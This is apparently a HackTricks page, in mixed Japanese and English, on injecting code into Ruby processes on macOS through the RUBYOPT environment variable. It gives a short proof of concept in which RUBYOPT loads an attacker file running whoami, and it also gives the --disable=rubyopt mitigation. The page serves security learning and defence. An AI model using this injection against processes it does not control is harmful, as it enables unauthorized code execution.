# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby は、script を実行する前に、`RUBYOPT` environment variable からサポートされている command-line switch を解析します。Ruby はそこで一部の switch を拒否しますが、`-I` で library-search directory を先頭に追加でき、`-r` で library を require できます。そのため、attacker-controlled environment variables を使って Ruby を起動する process は、attacker-controlled Ruby code を load するように仕向けられます。<sup>[[1]](#references)</sup>

`/tmp/inject.rb` を作成します:
```ruby:inject.rb
puts `whoami`
```
`hello.rb` のような benign な Ruby script を作成します：
```ruby:hello.rb
puts 'Hello, World!'
```
制御された `RUBYOPT` 値で実行します:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
この挙動を無効にするには、スクリプト名の**前**に `--disable=rubyopt`（または `--disable-rubyopt`）を渡します:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` の後に記述されたオプションはスクリプトに `ARGV` として渡されます。これは、Ruby による `RUBYOPT` の事前処理を無効化するものではありません。<sup>[[1]](#references)</sup>

## References

- [1] [Ruby ドキュメント - Ruby コマンドラインオプション](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
